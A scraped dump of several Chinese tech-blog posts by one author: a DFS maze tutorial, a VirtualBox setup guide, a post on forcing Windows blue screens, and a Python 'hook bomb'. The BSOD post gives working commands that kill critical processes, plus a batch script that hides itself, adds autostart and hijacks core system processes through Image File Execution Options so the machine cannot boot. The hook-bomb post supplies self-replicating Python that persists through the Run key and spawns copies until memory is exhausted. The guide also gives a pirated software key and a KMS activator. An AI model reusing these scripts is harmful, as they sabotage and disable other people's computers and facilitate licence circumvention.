yy): fl = [0, &quot;up &quot;, &quot;down &quot;, &quot;left &quot;, &quot;right&quot;] if xx &gt;= 1 and xx &lt;= n and yy &gt;= 1 and yy &lt;= n: if f[xx][yy] == 0: tmp = &quot;OK&quot; else: tmp = &quot;NO, because the way is not feasible.&quot; else: tmp = &quot;NO, because it's crossing the border.&quot; print(&quot;[(%d, %d) =&gt; (%d, %d)] Turning %s...&quot; % (x, y, xx, yy, fl[i]), tmp) return tmp == &quot;OK&quot; def dfs(x, y, starter = False): global ans f[x][y] = 1 if not starter: sleep(1) system(&quot;cls&quot;) for i in range(1, n+1): for j in range(1, n+1): print(str(f[i][j]), end=&quot; \\n&quot;[j == n]) print(&quot;\\nNotes:\\n&quot;) if x == n and y == n: f[n][n] = 0 print(&quot;Solve %d: We have reached the finish line!\\nWe are about to start backtracking and check other routes...\\n&quot; % ans) sleep(3) ans += 1 return for i in range(1, 5): xx, yy = x + fx[i], y + fy[i] tmp = &quot;&quot; if(tprint(i, x, y, xx, yy)): dfs(xx, yy) sleep(0.75) dfs(1, 1, True) print(&quot;\\nDFS is completed!&quot;) if ans == 1: print(&quot;There isn\\'t a solve.&quot;) 可以试着修改一下。 同样的，在 C++\\text{C++}C++ 中，我们解决迷宫问题的一般步骤为： 确定搜索方向 确定起点和终点 逐个点递归地枚举各个方向的路线 记录解 所以，我们在这道题中可以分析出： 搜索方向：上下左右或其他，均可。 储存的时候可以利用数组： int fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}; 这样通过当前的坐标位置分别加上数组中同一位置的数就可以实现方向的枚举，即： for(int i=1; i&lt;=4; i++){ newX = oldX + fx[i]; // 这里不建议 x1 y1 一类的，会和 bits/stdc++.h 冲突，产生莫名其妙的错误 newY = oldY + fy[i]; // 处理和递归 // …… } 确定起点和终点：题目中明确给出了起点和终点。 我们在搜索函数里将到达终点作为递归边界，一旦找到到达终点的路线就立即退出程序（此题中没必要继续搜索了）。 void dfs(int x, int y){ if(x == n &amp;&amp; y == m){ // 输出 // …… exit(0); // 退出程序 } } 枚举路线：避开墙、不能越界。 if(xx&gt;=1 &amp;&amp; xx&lt;=n &amp;&amp; yy&gt;=1 &amp;&amp; yy&lt;=m &amp;&amp; a[xx][yy]=='.'){ // 递归 // …… } 所以，完整程序如下： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; const int inf = 101; int n, m, ans, fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}; bool a[inf][inf]; void dfs(int x, int y){ a[x][y] = true; for(int i=1; i&lt;=4; i++){ int xx = x + fx[i], yy = y + fy[i]; if( xx &gt;= 1 &amp;&amp; xx &lt;= n &amp;&amp; yy &gt;= 1 &amp;&amp; yy &lt;= m &amp;&amp; !a[xx][yy] ) dfs(xx, yy); } } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n &gt;&gt; m; for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=m; j++){ char c; cin &gt;&gt; c; a[i][j] = c == '#'; } } dfs(1, 1); cout &lt;&lt; (a[n][m] ? &quot;Yes&quot; : &quot;No&quot;); return 0; } 另外，如果想输出路径，可以用结构体创建一个点的数据类型记录其坐标，再一个个输出。例如： 根据以往的经验，我们可以任意输出一组，就和问能否出去一样，只有一个记录路径。 那可能有人就要问了：前面的几节为什么有回溯呢？ ——我们现在只需要输出一组。如果需要输出多组（所有路径），当然要回溯啦！ 如果现在回溯的话，就会： 如果您的做法超时，请看： 完整程序： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; const int INF1 = 115, INF2 = 80; struct node{ int x, y; } f[801]; bool a[INF1][INF2]; int r, c, fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}; void dfs(int x, int y, int st){ a[x][y] = true; f[st].x = x, f[st].y = y; if(x == r &amp;&amp; y == c){ for(int i=1; i&lt;=st; i++){ cout &lt;&lt; f[i].x &lt;&lt; &quot; &quot; &lt;&lt; f[i].y &lt;&lt; endl; } exit(0); } for(int i=1; i&lt;=4; i++){ int xx = x + fx[i], yy = y + fy[i]; if(xx&gt;=1 &amp;&amp; xx&lt;=r &amp;&amp; yy&gt;=1 &amp;&amp; yy&lt;=c &amp;&amp; !a[xx][yy] &amp;&amp; st+1&lt;=int(1e6)+1){ dfs(xx, yy, st + 1); // a[xx][yy] = false; } } } int main(){ ios :: sync_with_stdio(0); memset(a, -1, sizeof(a)); cin &gt;&gt; r &gt;&gt; c; for(int i=1; i&lt;=r; i++){ for(int j=1; j&lt;=c; j++){ char ch; cin &gt;&gt; ch; a[i][j] = !(ch == '.'); } } dfs(1, 1, 1); return 0; } 如下是全部路径的题，可以思考一下怎么做！ // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; const int INF = 6; int n, m, ans, startX, startY, endX, endY, fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}, p[INF*INF][3]; bool v[INF][INF]; void dfs(int x, int y, int step=1){ if(!v[x][y]) return; v[x][y] = false, p[step][1] = x, p[step][2] = y; if(x == endX &amp;&amp; y == endY){ ans++; if(ans == 51){ printf(&quot;total: 50+&quot;); exit(0); } for(int i=1; i&lt;=step-1; i++){ printf(&quot;(%d, %d) =&gt; &quot;, p[i][1], p[i][2]); } printf(&quot;(%d, %d)\\n&quot;, p[step][1], p[step][2]); return; } for(int i=1; i&lt;=4; i++){ int xx = x + fx[i], yy = y + fy[i]; if( xx &gt;= 1 &amp;&amp; xx &lt;= n &amp;&amp; yy &gt;= 1 &amp;&amp; yy &lt;= m &amp;&amp; v[xx][yy] ){ dfs(xx, yy, step+1); v[xx][yy] = true; } } } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n &gt;&gt; m; for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=m; j++){ char c; cin &gt;&gt; c; v[i][j] = (c != '0'); } } cin &gt;&gt; startX &gt;&gt; startY &gt;&gt; endX &gt;&gt; endY; dfs(startX, startY); printf(&quot;total: %d&quot;, ans); return 0; } // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; const int INF = 11; int n, m, biggest, smallest, startX, startY, endX, endY, bigStep, smallStep, a[INF][INF], b[INF*INF][3], big[INF*INF][3], small[INF*INF][3], fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}; bool v[INF][INF]; void dfs(int x, int y, int step=1, int res=0){ v[x][y] = true, b[step][1] = x, b[step][2] = y, res += a[x][y]; if( x == endX &amp;&amp; y == endY ){ if(res &gt; biggest){ biggest = res, bigStep = step; memset(big, 0, sizeof(big)); for(int i=1; i&lt;=step+1; i++){ big[i][1] = b[i][1], big[i][2] = b[i][2]; } } if(res &lt; smallest){ smallest = res, smallStep = step; memset(small, 0, sizeof(small)); for(int i=1; i&lt;=step+1; i++){ small[i][1] = b[i][1], small[i][2] = b[i][2]; } } return; } for(int i=1; i&lt;=4; i++){ int xx = x + fx[i], yy = y + fy[i]; if( xx &gt;= 1 &amp;&amp; xx &lt;= n &amp;&amp; yy &gt;= 1 &amp;&amp; yy &lt;= m &amp;&amp; !v[xx][yy] ){ dfs(xx, yy, step+1, res); v[xx][yy] = false; } } } int main(){ ios :: sync_with_stdio(false); cin.tie(0); cout.tie(0); biggest = INT_MIN, smallest = INT_MAX; cin &gt;&gt; n &gt;&gt; m; for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=m; j++){ cin &gt;&gt; a[i][j]; } } cin &gt;&gt; startX &gt;&gt; startY &gt;&gt; endX &gt;&gt; endY; dfs(startX, startY); printf(&quot;biggest: %d\\n&quot;, biggest); for(int i=1; i&lt;=bigStep-1; i++){ printf(&quot;(%d, %d) =&gt; &quot;, big[i][1], big[i][2]); } printf(&quot;(%d, %d)\\n&quot;, big[bigStep][1], big[bigStep][2]); printf(&quot;smallest: %d\\n&quot;, smallest); for(int i=1; i&lt;=smallStep-1; i++){ printf(&quot;(%d, %d) =&gt; &quot;, small[i][1], small[i][2]); } printf(&quot;(%d, %d)&quot;, small[smallStep][1], small[smallStep][2]); return 0; } 记忆化搜索 什么是记忆化呢？ 记忆化搜索 - OI Wiki (oi-wiki.org) // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; #define endl &quot;\\n&quot; #define ll long long const ll INF = 101; ll x, y, z, f[INF][INF][INF]; ll w(ll a, ll b, ll c){ if(a &lt;= 0 || b &lt;= 0 || c &lt;= 0) return 1; else if(f[a][b][c]) return f[a][b][c]; else if(a &gt; 20 || b &gt; 20 || c &gt; 20) return f[a][b][c] = w(20, 20, 20); else if(a &lt; b &amp;&amp; b &lt; c) return f[a][b][c] = w(a, b, c-1) + w(a, b-1, c-1) - w(a, b-1, c); else return f[a][b][c] = w(a-1, b, c) + w(a-1, b-1, c) + w(a-1, b, c-1) - w(a-1, b-1, c-1); } int main(){ ios :: sync_with_stdio(false); while(cin &gt;&gt; x &gt;&gt; y &gt;&gt; z){ // memset(f, 0, sizeof(f)); if(x == -1 &amp;&amp; y == -1 &amp;&amp; z == -1) break; ll tmpX, tmpY, tmpZ; tmpX = min(21ll, x); tmpY = min(21ll, y); tmpZ = min(21ll, z); printf(&quot;w(%ld, %ld, %ld) = %ld\\n&quot;, x, y, z, w(tmpX, tmpY, tmpZ)); } return 0; } 后面会和动态规划联系在一起讲。 ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"九、DFS","feature":"https://daoxi365.github.io/tech-blog//post-images/jiu-dfs.png","link":"https://daoxi365.github.io/tech-blog/jiu-dfs/","stats":{"text":"24 min read","time":1414000,"words":4695,"minutes":24},"date":"2023-07-16 21:41:27","dateFormat":"2023-07-16"},{"content":"也许你可能遇到过这样的问题： 我自己开发了一款软件，在本地测试完全没问题，但是会不会在别的电脑上出现 bug\\text{bug}bug 呐？但是我也没有其他的电脑，我也不好意思找朋友借…… 我是一个黑客技术爱好者，我想要在一台电脑上练习渗透技术怎么办……或者我想要研究系统的原理，但在自己电脑上直接实验代价太大，这怎么办……亦或者我想学习 B\\text{B}B 站科技区 UP\\text{UP}UP 主探究/修复病毒，但是不想装影子系统…… …… 那么，如果你看到这篇文章并且照着做一做，就有可能实现你想要的效果。 （欢迎访问 PDF\\text{PDF}PDF 版（镜像版），文件较大，请切换连接较好的网络） 文章目录 文章目录 1.1.1. 虚拟机软件安装及准备 1.11.11.1 软件的安装 1.1.1 Virtualbox1.1.1 \\text{ Virtualbox}1.1.1 Virtualbox 安装 1.1.2 Ultral ISO1.1.2 \\text{ Ultral ISO}1.1.2 Ultral ISO 安装和激活 1.1.3 Thunders1.1.3\\text{ Thunders}1.1.3 Thunders 下载工具的安装 1.1.4 PE\\text{1.1.4 PE}1.1.4 PE 系统下载和准备 1.1.5 \\text{1.1.5 }1.1.5 系统镜像准备 1.1.5.1\\text{1.1.5.1}1.1.5.1 原版系统镜像 1.1.5.2 Ghost1.1.5.2 \\text{ Ghost}1.1.5.2 Ghost 镜像制作 1.2 Virtualbox\\text{1.2 Virtualbox}1.2 Virtualbox 配置 1.2.11.2.11.2.1 新建虚拟机 1.2.21.2.21.2.2 挂载系统镜像 2.2.2. 操作系统安装 2.12.12.1 从 PE\\text{PE}PE 恢复系统 2.1.12.1.12.1.1 使用 DG\\text{DG}DG 对磁盘分区 2.1.22.1.22.1.2 导出镜像 2.1.2.12.1.2.12.1.2.1 原版系统镜像 2.1.2.2 Ghost2.1.2.2 \\text{ Ghost}2.1.2.2 Ghost 系统安装 2.22.22.2 进入系统 2.2.12.2.12.2.1 系统网络连接 2.2.22.2.22.2.2 安装增强功能 2.2.32.2.32.2.3 激活系统（仅对于原版） 3.3.3. 系统个性化设置 3.13.13.1 桌面图标设置 3.23.23.2 鼠标指针设置 3.33.33.3 分辨率 3.43.43.4 显示拓展名 3.53.53.5 拍摄快照、恢复快照 本文为 Luogu\\text{Luogu}Luogu 用户「PanDaoxi\\text{PanDaoxi}PanDaoxi」的原创文章，遵循 CC 4.0 BY-SA\\text{CC 4.0 BY-SA}CC 4.0 BY-SA 版权协议，转载请附上原文出处及本声明。 1.1.1. 虚拟机软件安装及准备 在这部分，我们将安装虚拟机软件，为接下来的操作做一些准备。 1.11.11.1 软件的安装 我们主要用到的软件有： Virtualbox\\text{Virtualbox}Virtualbox 最新版本 Ultral ISO\\text{Ultral ISO}Ultral ISO （已经激活） Thunders\\text{Thunders}Thunders 精简版迅雷下载工具 自己熟悉的 PE\\text{PE}PE 系统（本文以 Fir PE\\text{Fir PE}Fir PE 做演示） 原版系统镜像网站或可信的 Ghost\\text{Ghost}Ghost 系统网站。 1.1.1 Virtualbox1.1.1 \\text{ Virtualbox}1.1.1 Virtualbox 安装 可以到官网下载，下载后一路默认设置即可。参考【文章】的第三部分。 1.1.2 Ultral ISO1.1.2 \\text{ Ultral ISO}1.1.2 Ultral ISO 安装和激活 首先这是个啥？有啥用？ ——这是一个制作DVD刻录文件的东西，这个玩意儿有很大用处。 下载可以从官网下载： 最新UltraISO官方免费下载 - UltraISO软碟通中文官方网站 这里下载下来安装好，要求我们注册（提供注册名什么的），我们输入以下信息： 注册名：Guanjiu 激活码：A06C-83A7-701D-6CFC 安装成功后的界面大概就是上图的样子了。使用过程也很简单，只要把要用的东西拖到上面去就可以了。 等到进度条跑完，这个文件也就生成了： 生成的文件大小，会由你选定的文件决定。 1.1.3 Thunders1.1.3\\text{ Thunders}1.1.3 Thunders 下载工具的安装 可以从 HelloWindows\\text{HelloWindows}HelloWindows 上下载，点击侧栏的“下载工具”，把这款下载下来。 下载好了以后，运行 Program\\thunder.exe 打开迅雷，关闭所有杀毒软件！ 1.1.4 PE\\text{1.1.4 PE}1.1.4 PE 系统下载和准备 推荐： 优启通 v3.7.2022.1024（2022.12.08 发布）_IT天空原创软件_IT天空 (itsk.com) 微PE工具箱 - 超好用的装机维护工具 (wepe.com.cn) FirPE Project - 也许是最适合年轻人使用的第三方WinPE 这三款都比较纯净，安装出来的系统不会带软件，尽量别用老毛桃和大白菜，因为你得万分谨慎才能避免它在新系统里装软件。 下载下来后，生成本地镜像即可。 需要注意的是，如果你的系统版本比较低，可能会导致内存不够，需要使用微 PE\\text{PE}PE ；但是微 PE\\text{PE}PE 不支持网络连接！ 1.1.5 \\text{1.1.5 }1.1.5 系统镜像准备 1.1.5.1\\text{1.1.5.1}1.1.5.1 原版系统镜像 优点： 完完全全没流氓软件； 有全面的功能，不会被精简； 可以选择任意的版本。 缺点： 需要激活系统； 可能要进行一系列设置。 推荐两个网站，可以下载原版镜像： HelloWindows.cn - 精校 完整 极致 Windows系统下载仓储站 MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn) 这两个网站都提供 ed2k\\text{ed2k}ed2k 链接下载： 在这里我把链接放出来方便下载： ed2k://|file|cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso|3420557312|430BEDC0F22FA18001F717F7AF08C9D5|/ 可能要稍等一会儿。 等它下载好就行啦，长得也是这个样： 1.1.5.2 Ghost1.1.5.2 \\text{ Ghost}1.1.5.2 Ghost 镜像制作 优点： 速度快，有精简，免激活； 一般比较稳定。 缺点： 容易被装流氓软件。 纯净版系统_Win10纯净版64位_纯净版XP系统-爱纯净官网 (aichunjing.com) 这个网站里收录了好多纯净版二次制作系统。找一款你想要的，下载下来就行，重点在于制作镜像，挂载到虚拟机上。 请参照 1.1.21.1.21.1.2 的方法，制作镜像。 1.2 Virtualbox\\text{1.2 Virtualbox}1.2 Virtualbox 配置 1.2.11.2.11.2.1 新建虚拟机 打开 Virtualbox\\text{Virtualbox}Virtualbox 虚拟机软件，点击左上方新建。 注意：命名不要有特殊符号，也不要用空格。 这样，你就有了一台新的虚拟机。 1.2.21.2.21.2.2 挂载系统镜像 选上你以前下载的 PE\\text{PE}PE 系统和系统镜像。 启动时选定从 PE\\text{PE}PE 启动，进入 PE\\text{PE}PE 系统，开始系统安装。 2.2.2. 操作系统安装 2.12.12.1 从 PE\\text{PE}PE 恢复系统 进入 PE\\text{PE}PE 系统后，可以看到一个很漂亮的环境： 接下来，我们将使用这个 PE\\text{PE}PE 系统安装 Windows\\text{Windows}Windows。 2.1.12.1.12.1.1 使用 DG\\text{DG}DG 对磁盘分区 运行桌面上的 DiskGenius，打开分区工具。 可以自选分区数量。我没有过多的需要，我就分一个。 等待它完成后关闭即可。可以看到“此电脑”里已经有了卷： 现在，我们要正式开始安装系统了。 2.1.22.1.22.1.2 导出镜像 2.1.2.12.1.2.12.1.2.1 原版系统镜像 挂载上原版系统镜像。 如果这里进来后是一个窗口，说是安装程序，那就先关掉，右键新窗口打开。这是 autorun.inf 自动运行导致的。 确认无误后，打开 EasyRC 工具。 如果打不开，有可能是因为你的 PE\\text{PE}PE 镜像和系统镜像错位了，调换一下就好。 正常打开应该是这样的： 现在，点击“浏览”，找到你的镜像磁盘中 source/install.wim 。 先点中上面的C:\\，然后让它自己安装就行。 这小海豚和 Easy\\text{Easy}Easy 系列，应该是 ITSK\\text{ITSK}ITSK 出的。安装需要一段时间，耐心等待一会儿吧！ 不用搭理它，它会自己安装好进入桌面。 2.1.2.2 Ghost2.1.2.2 \\text{ Ghost}2.1.2.2 Ghost 系统安装 类比于刚才的办法，同样进入 PE\\text{PE}PE 后，打开 EasyRC\\text{EasyRC}EasyRC，安装系统。 这也是自动安装的，不用搭理它。 2.22.22.2 进入系统 这两者终于殊途同归，进入了 Windows 7\\text{Windows 7}Windows 7 的页面。 2.2.12.2.12.2.1 系统网络连接 这个很简单，看你的需要，可以在设置、网络找到。这里简单解释一下： NAT ：把你的虚拟机放到了一个虚拟的网络里面，跟物理机和局域网没啥关系，但是还能正常上网。 桥接网卡：把这台虚拟机放到了局域网内，这样可以和同在局域网内的设备共享。 仅主机：就是切断虚拟机网络连接。 2.2.22.2.22.2.2 安装增强功能 右上方设备，点击倒数第二个。 这时会挂载上一个新的磁盘，就是 Virtualbox\\text{Virtualbox}Virtualbox 图标的这个，进去安装这个： 全部信任来自它的软件。 重启以前：在”设备“中，开启所有增强功能： 拖动：双向 共享粘贴板：双向 声音：输入、输出 共享文件夹：管理—新建（右边第一个图标）—选一个你记得住的文件夹 然后重启。 这时，“我的电脑”里已经有了共享文件夹，在物理机内放的文件可以从共享文件夹复制到虚拟机上。 虚拟机有没有写入的权限，取决于上图中是否选择“只读分配”。 也可以把文件拖入了： 2.2.32.2.32.2.3 激活系统（仅对于原版） HelloWindows.cn - 精校 完整 极致 Windows系统下载仓储站 推荐网站里面激活工具的最后一个。网址放出来： https://www.lanzouw.com/ibVCwuzvt2h 运行 HEU_KMS_Activator_v23.1.0.exe： 重启电脑后，系统已经被激活。 至此，系统设置完工。 3.3.3. 系统个性化设置 3.13.13.1 桌面图标设置 由于个人审美，Windows 7\\text{Windows 7}Windows 7 系统我喜欢看到第一个是用户图标。如何找到？ 桌面—右键—个性化—更改桌面图标（左侧栏）—选你喜欢的—应用（确定） 3.23.23.2 鼠标指针设置 Windows 7\\text{Windows 7}Windows 7 支持 XP\\text{XP}XP 风格的鼠标指针，还能设置阴影。用上了成套的主题： 如果都不喜欢，可以从网上能找到别的样式。 3.33.33.3 分辨率 emm，分辨率全靠自己拖，我记得别的好像全屏的时候自动就全屏了…… 3.43.43.4 显示拓展名 3.53.53.5 拍摄快照、恢复快照 这个快照的功能就类似于影子系统，通过快照记录当前系统的状态，避免操作不当引起系统损坏，这时就可以一键恢复。 点击右侧的“备份”： 如需恢复，需要先关闭虚拟机，然后： 恢复以后应该是这种状态。再次启动，即可恢复拍摄快照时的样子。 …… 完结撒花！✨ 更多内容，欢迎关注：Luogu @PanDaoxi\\text{Luogu @PanDaoxi}Luogu @PanDaoxi ","tags":[{"index":-1,"name":"教程","slug":"tutorial","used":true,"link":"https://daoxi365.github.io/tech-blog/tutorial/"}],"title":"Virtualbox 使用教程","feature":"https://daoxi365.github.io/tech-blog//post-images/virtualbox-shi-yong-jiao-cheng.png","link":"https://daoxi365.github.io/tech-blog/virtualbox-shi-yong-jiao-cheng/","stats":{"text":"12 min read","time":707000,"words":2933,"minutes":12},"date":"2023-07-02 15:44:25","dateFormat":"2023-07-02"},{"content":"电脑蓝屏，又叫蓝屏死机（Blue Screen of Death，简称 BSOD），是微软的 Windows 系列操作系统在无法从一个系统错误中恢复过来时，为保护电脑数据文件不被破坏而强制显示的屏幕图像。 Windows 操作系统的蓝屏死机提示已经成为标志性的画面。大部分是系统崩溃的现象。 Windows 中有两个蓝底白字图像都被称为蓝屏死机：一种是 Windows 9x 操作系统发生小故障，一种是 Windows NT 发生内核错误。由于 Windows 9x 已退出历史舞台，所以现在一般指后者。 蓝屏的方法 如果你想要制作一个可以导致蓝屏的程序，不妨试试以下几种办法。这些办法有的不会对系统造成伤害，有的则可能导致系统无法开机。建议您在备份好数据的情况下再继续作死。 文章中所提的内容仅供学术交流和参考，请勿用于非法用途或欺骗他人。不当使用导致的不良后果与原作者无关。 另外，本文中的命令行都是通过 Bat_To_Exe_Converter 转化为 .exe 可执行程序的，所以自启动等项目可能会失效。 结束系统关键进程（CRITICAL PROCESS DIED） 对系统无害，在 Windows XP 以上才有用（XP 会关机）。 可以直接结束关键的 Windows NT 进程，例如 wininit.exe、smss.exe、csrss.exe 等；也可以直接结束全部进程。 以下命令，任选其一都可以导致蓝屏。 taskkill /im wininit.exe /f taskkill /im svchost.exe /f taskkill /fi &quot;pid ne 1&quot; /f cmd /c for /f %I in ('wmic process get Name')do (wmic process where Name=&quot;%I&quot; delete) 对于 Windows 10 及以上，也可以使用 PowerShell 直接访问 wininit.exe，造成电脑蓝屏！ 具体地，打开 PowerShell 后直接输入 wininit 即可。 使用 notmyfault（驱动文件 notmyfault.sys） 对 Windows XP 以上才有用，Windows XP x64 有可能可以。 需要用到第三方软件，来源于 Microsoft Sysinternals Suite 中的 notmyfault 系列。 我们只用到 notmyfaultc 和 notmyfaultc64，这是命令行版本的；其他那两个是 GUI 版。 具体的命令： @echo off if %PROCESSOR_ARCHITECTURE%==AMD64 ( notmyfaultc64.exe /accepteula notmyfaultc64.exe /crash 0x03 ) else ( notmyfaultc.exe /accepteula notmyfaultc.exe /crash 0x03 ) 首先要确定系统的位数，再调用蓝屏。 第 444 行和第 777 行可以改变，是根据想要的蓝屏类型确定的；也可以挂起进程。 使用说明如下： NotMyFault is a tool used in the Windows Internals books to show how common device driver bugs affect a system. This is the console version of NotMyFault. Usage: notmyfaultc.exe [/wait] /crash crash_type_num crash type: 0x01: High IRQL fault (Kernel-mode) 0x02: Buffer overflow 0x03: Code overwrite 0x04: Stack trash 0x05: High IRQL fault (User-mode) 0x06: Stack overflow 0x07: Hardcoded breakpoint 0x08: Double Free wait: wait until named event NOTMYFAULT is set Or notmyfaultc.exe /hang hang_type_num hang type: 0x01: Hang with IRP 0x02: Hang with DPC 0x03: Deadlock Or notmyfaultc.exe /leak leak_type_num [/rate KB/s] [/duration seconds] leak type: 0x01: Paged Leak 0x02: Nonpaged Leak rate: default value is 1000 KB/s append 'm' for megabytes, 'g' for gigabytes or 't' for terabytes duration: default value is 30s Or notmyfaultc.exe bugcheck id Or notmyfaultc.exe /getdumptype notmyfaultc.exe setdumptype [full|kernel] 删除或劫持内核关键程序（0xc000021a） 前面两种方法，重启后即可恢复（除非设置了自启动），那么下面就介绍两种较难修复的。 删除关键程序，需要到 PE 中去提取或恢复。因为是系统文件，所以一般的用户无法修改，提权过程也相对复杂，推荐使用 NSudo 工具，命令行版可以轻松删除系统文件。 关于劫持，可以在注册表中进行调整，通过命令行的方式写入注册表（附赠一只自启动）： @echo off copy %0 v.exe attrib +s +h /s /d v.exe reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Run&quot; /f /v &quot;vvvvv&quot; /t REG_SZ /d &quot;%cd%\\v.exe&quot; reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wininit.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\\\&quot; reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\smss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\\\&quot; reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\csrss.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\\\&quot; reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\\\&quot; reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\\\&quot; reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\spoolsv.exe&quot; /f /v debugger /t REG_SZ /d &quot;\\\\&quot; shutdown /r /t 0 不同于一般的自启动，由于内核关键进程在进入桌面之前就已经启动，所以在锁屏页面前就会蓝屏；安全模式同样。在 Windows XP 中表现为黑屏，只有鼠标可以移动。 修复方法，就是进入 PE 系统删除映像劫持项目和自启动项目，删除释放的文件等。 假蓝屏 网上各种各样的批处理假蓝屏烂大街了，有一个真实一点的工具叫 BluescreenSimulator，可以通过命令行调用。 因为有点儿跑题，这里不再赘述。 ","tags":[{"index":-1,"name":"整活","slug":"TFA","used":true,"link":"https://daoxi365.github.io/tech-blog/TFA/"}],"title":"快速让电脑蓝屏","feature":"https://daoxi365.github.io/tech-blog//post-images/BSOD-de-ji-qiao.png","link":"https://daoxi365.github.io/tech-blog/BSOD-de-ji-qiao/","stats":{"text":"6 min read","time":328000,"words":1253,"minutes":6},"date":"2023-07-02 13:03:51","dateFormat":"2023-07-02"},{"content":"# Author:PanDaoxi from tkinter import Tk,Label from random import randint from os import system,name,environ from time import sleep title = &quot;Message&quot; message = &quot;不好意思，您的电脑废了&quot; loops = [] window = Tk() width = window.winfo_screenwidth() height = window.winfo_screenheight() x = randint(0,width) y = randint(0,height) window.geometry(&quot;350x50+&quot; + str(x) + &quot;+&quot; + str(y)) window.title(title) window.resizable(0, 0) path = environ[&quot;windir&quot;] system('start /min cmd /c reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;funnywindows&quot; /t REG_SZ /d &quot;%s&quot; /f' % __file__) def main(): global loops,window Label(window,text=message,font=('Microsoft YaHei',20)).pack() with open(__file__,&quot;r&quot;,encoding=&quot;utf-8&quot;) as f: text = f.read() for i in range(0,2): content = &quot;%s\\\\%d.py&quot; % (path,randint(100000,999999)) with open(content,&quot;w&quot;,encoding=&quot;utf-8&quot;) as f: f.write(text) loops.append(content) for i in range(0,2): system(&quot;start /min cmd /c python %s&quot; % loops[i]) if __name__ == &quot;__main__&quot; and name == &quot;nt&quot;: main() else: showerror(&quot;Message&quot;,&quot;无法运行程序，原因可能是：\\n(1)您非主动运行程序。\\n(2)这个程序不能在当前系统下运行，请尝试其他操作系统。&quot;) exit() window.mainloop() 修复方法也很简单，到安全模式下删了自启动，删掉目录下所有弹窗文件就行。 我给它起名字：“等比弹窗”。 另附一非弹窗版，速度更快： # Author:PanDaoxi from os import system, environ from random import randint, shuffle from sys import exit names_char, p1, p2 = [], &quot;&quot;, &quot;&quot; for i in range(97, 123): names_char.append(chr(i)) for i in range(65, 91): names_char.append(chr(i)) for i in range(48, 58): names_char.append(chr(i)) def makeNames(): name, temp = &quot;&quot;, names_char shuffle(temp) name = &quot;&quot;.join(temp) start = randint(0, len(name) - 1) end = randint(start, len(name) - 1) + 1 return name[start : end] try: with open(__file__, &quot;rb&quot;) as source: pandaoxi = source.read() tPath = environ[&quot;UserProFile&quot;] p1, p2 = tPath + &quot;\\\\%s.py&quot; % makeNames(), tPath + &quot;\\\\%s.py&quot; % makeNames() with open(p1, &quot;wb&quot;) as w1: w1.write(pandaoxi) with open(p2, &quot;wb&quot;) as w2: w2.write(pandaoxi) system(&quot;start /min python \\&quot;%s\\&quot;&quot; % p1) system(&quot;start /min python \\&quot;%s\\&quot;&quot; % p2) exit() except: exit() ","tags":[{"index":-1,"name":"整活","slug":"TFA","used":true,"link":"https://daoxi365.github.io/tech-blog/TFA/"}],"title":"使用 Python 快速占满内存（Hook 炸弹）","feature":"https://daoxi365.github.io/tech-blog//post-images/shi-yong-python-kuai-su-zhan-man-nei-cun-hook-zha-dan.webp","link":"https://daoxi365.github.io/tech-blog/shi-yong-python-kuai-su-zhan-man-nei-cun-hook-zha-dan/","stats":{"text":"3 min read","time":156000,"words":465,"minutes":3},"date":"2023-05-14 11:56:00","dateFormat":"2023-05-14"},{"content":" 对于一个新手 OIer\\text{OIer}OIer，我们的首题一般都是 A+BA+BA+B。 但是我们要严格要求自己，应该采用高级一点的算法去解决同类问题。 高精度就是一个深化版基本运算的例子。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; #define endl &quot;\\n&quot; using namespace std; const int INF = 101; // 支持 (INF-1) 位的运算 struct bn{ // 大数结构体 string s, absn; // s: 输入的数 absn: 绝对值 int num[INF], len, absLen; // num: 逆序存储 len: 输入的数的长度 absLen: 绝对值的长度 bool neg; // neg: 负数标记 void inp(){ cin &gt;&gt; s; len = s.size(); neg = (s[0] == '-'); // 获取负数标记 absn = neg ? s.substr(neg) : s; // 截取绝对值 absLen = absn.size(); // 获取绝对值长度 for(int i=0; i&lt;absLen; i++){ // 只记录绝对值的逆序，和符号无关 